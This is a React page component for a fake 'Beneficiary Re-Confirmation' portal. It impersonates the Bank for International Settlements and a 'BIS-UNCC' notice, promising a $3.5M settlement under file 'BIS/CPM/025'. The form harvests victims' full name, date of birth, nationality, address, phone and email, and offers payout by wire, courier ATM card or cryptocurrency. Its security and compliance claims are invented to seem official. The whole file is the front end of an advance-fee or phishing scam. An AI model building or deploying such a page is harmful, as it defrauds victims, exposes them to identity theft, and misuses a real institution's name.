
import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { 
  User, Globe, Mail, Landmark, AlertCircle, Calendar, 
  MapPin, Phone, CreditCard, ShieldCheck, Loader2, 
  FileText, Lock, FileBadge
} from 'lucide-react';
import GlassCard from '../components/GlassCard';
import MotionButton from '../components/MotionButton';
import { VerificationFormData } from '../types';

interface VerifyProps {
  onSuccess: (data: VerificationFormData) => void;
}

const Verify: React.FC<VerifyProps> = ({ onSuccess }) => {
  const [formData, setFormData] = useState<VerificationFormData>({
    fullName: '',
    dob: '',
    nationality: '',
    occupation: '',
    address: '',
    phone: '',
    email: '',
    paymentMethod: 'Bank Direct Wire Transfer',
    referenceId: 'BIS/CPM/025'
  });

  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    // Simulate official processing delay
    setTimeout(() => {
      setIsLoading(false);
      onSuccess(formData);
    }, 2000);
  };

  const labelClass = "text-xs font-bold text-slate-500 mb-1.5 uppercase tracking-wider block";
  const inputClass = "w-full pl-10 pr-4 py-3 rounded-xl border border-slate-200 focus:border-blue-600 focus:ring-4 focus:ring-blue-100 transition-colors outline-none bg-white/70 text-slate-900 font-medium placeholder:text-slate-400";
  const focusAnimation = { scale: 1.01, transition: { type: "spring", stiffness: 300, damping: 20 } };

  return (
    <div className="pt-32 pb-24 max-w-5xl mx-auto px-4">
      <div className="text-center mb-10">
        <h2 className="text-3xl font-bold text-slate-900 mb-2">Beneficiary Re-Confirmation</h2>
        <p className="text-slate-500">Crediting Allotted Amount to File: <span className="font-bold text-blue-600">BIS/CPM/025</span></p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Left Side: Form */}
        <div className="lg:col-span-7">
          <GlassCard>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 flex gap-3 items-start">
                <AlertCircle className="w-5 h-5 text-blue-600 shrink-0 mt-0.5" />
                <p className="text-xs text-blue-800 font-medium leading-relaxed">
                  Kindly re-confirm your personal information accurately. This data will be cross-referenced with the 
                  <span className="font-bold"> BIS Global Settlement Database</span> to authorize your $3.5M disbursement.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="relative md:col-span-2">
                  <label className={labelClass}>Full Names</label>
                  <User className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.input 
                    whileFocus={focusAnimation} 
                    required 
                    type="text" 
                    placeholder="Enter your legal full name"
                    className={inputClass} 
                    value={formData.fullName} 
                    onChange={e => setFormData({...formData, fullName: e.target.value})} 
                  />
                </div>
                <div className="relative">
                  <label className={labelClass}>Date of Birth</label>
                  <Calendar className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.input 
                    whileFocus={focusAnimation} 
                    required 
                    type="text" 
                    placeholder="DD/MM/YYYY" 
                    className={inputClass} 
                    value={formData.dob} 
                    onChange={e => setFormData({...formData, dob: e.target.value})} 
                  />
                </div>
                <div className="relative">
                  <label className={labelClass}>Nationality</label>
                  <Globe className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.input 
                    whileFocus={focusAnimation} 
                    required 
                    type="text" 
                    placeholder="Country of Citizenship"
                    className={inputClass} 
                    value={formData.nationality} 
                    onChange={e => setFormData({...formData, nationality: e.target.value})} 
                  />
                </div>
                <div className="relative md:col-span-2">
                  <label className={labelClass}>Physical Address</label>
                  <MapPin className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.input 
                    whileFocus={focusAnimation} 
                    required 
                    type="text" 
                    placeholder="Full residential address"
                    className={inputClass} 
                    value={formData.address} 
                    onChange={e => setFormData({...formData, address: e.target.value})} 
                  />
                </div>
                <div className="relative">
                  <label className={labelClass}>Telephone</label>
                  <Phone className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.input 
                    whileFocus={focusAnimation} 
                    required 
                    type="tel" 
                    placeholder="+1 (555) 000-0000"
                    className={inputClass} 
                    value={formData.phone} 
                    onChange={e => setFormData({...formData, phone: e.target.value})} 
                  />
                </div>
                <div className="relative">
                  <label className={labelClass}>Email Address</label>
                  <Mail className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.input 
                    whileFocus={focusAnimation} 
                    required 
                    type="email" 
                    placeholder="name@example.com"
                    className={inputClass} 
                    value={formData.email} 
                    onChange={e => setFormData({...formData, email: e.target.value})} 
                  />
                </div>
                <div className="relative md:col-span-2">
                  <label className={labelClass}>Payment Method Preference</label>
                  <CreditCard className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
                  <motion.select 
                    whileFocus={focusAnimation} 
                    className={`${inputClass} appearance-none cursor-pointer`} 
                    value={formData.paymentMethod} 
                    onChange={e => setFormData({...formData, paymentMethod: e.target.value})}
                  >
                    <option>Bank Direct Wire Transfer</option>
                    <option>ATM Card (Priority Courier Delivery)</option>
                    <option>Digital Asset Settlement (USDT/BTC)</option>
                    <option>Certified Check Payment (Express Mail)</option>
                  </motion.select>
                </div>
              </div>

              <div className="pt-4">
                <MotionButton 
                  type="submit" 
                  variant="primary" 
                  className="w-full py-4 text-lg bg-blue-700 hover:bg-blue-800 disabled:bg-slate-300" 
                  disabled={isLoading}
                >
                  {isLoading ? (
                    <div className="flex items-center gap-3">
                      <Loader2 className="w-6 h-6 animate-spin" />
                      <span>Processing Lodgement...</span>
                    </div>
                  ) : (
                    <div className="flex items-center gap-3">
                      <FileBadge className="w-5 h-5" />
                      <span>Submit Settlement Claim</span>
                    </div>
                  )}
                </MotionButton>
              </div>
            </form>
          </GlassCard>
        </div>

        {/* Right Side: Information & Compliance */}
        <div className="lg:col-span-5 space-y-6">
          <GlassCard className="bg-slate-900 border-slate-800 text-white">
            <h3 className="text-xl font-bold mb-6 flex items-center gap-3">
              <ShieldCheck className="w-6 h-6 text-blue-400" /> Security Protocol
            </h3>
            <div className="space-y-6">
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-blue-600/20 rounded-lg flex items-center justify-center shrink-0">
                  <Lock className="w-5 h-5 text-blue-400" />
                </div>
                <div>
                  <h4 className="text-sm font-bold text-slate-200 mb-1">End-to-End Encryption</h4>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Your data is secured using institutional-grade AES-256 encryption before transmission to the CPMI committee.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-green-600/20 rounded-lg flex items-center justify-center shrink-0">
                  <FileText className="w-5 h-5 text-green-400" />
                </div>
                <div>
                  <h4 className="text-sm font-bold text-slate-200 mb-1">Compliance Check</h4>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Submission of this form triggers an automatic verification against File BIS/CPM/025 records.
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-yellow-600/20 rounded-lg flex items-center justify-center shrink-0">
                  <Landmark className="w-5 h-5 text-yellow-400" />
                </div>
                <div>
                  <h4 className="text-sm font-bold text-slate-200 mb-1">Bank Assignment</h4>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Upon successful lodgement, an accredited bank will be assigned to handle the $3,500,000.00 disbursement.
                  </p>
                </div>
              </div>
            </div>

            <div className="mt-8 p-4 bg-white/5 rounded-xl border border-white/10">
              <p className="text-[10px] text-slate-400 italic text-center">
                Official BIS-UNCC Regulatory Notice: Claims are processed in order of receipt. 
                Ensure all fields match your legal documentation to avoid delays.
              </p>
            </div>
          </GlassCard>

          <div className="rounded-2xl overflow-hidden shadow-lg border-4 border-white">
            <img 
              src="https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&q=80&w=800" 
              alt="Financial District" 
              className="w-full h-48 object-cover grayscale opacity-80"
            />
            <div className="bg-white p-4 text-center">
              <span className="text-[10px] font-bold text-blue-700 uppercase tracking-widest">Global Settlement Initiative 2025</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Verify;
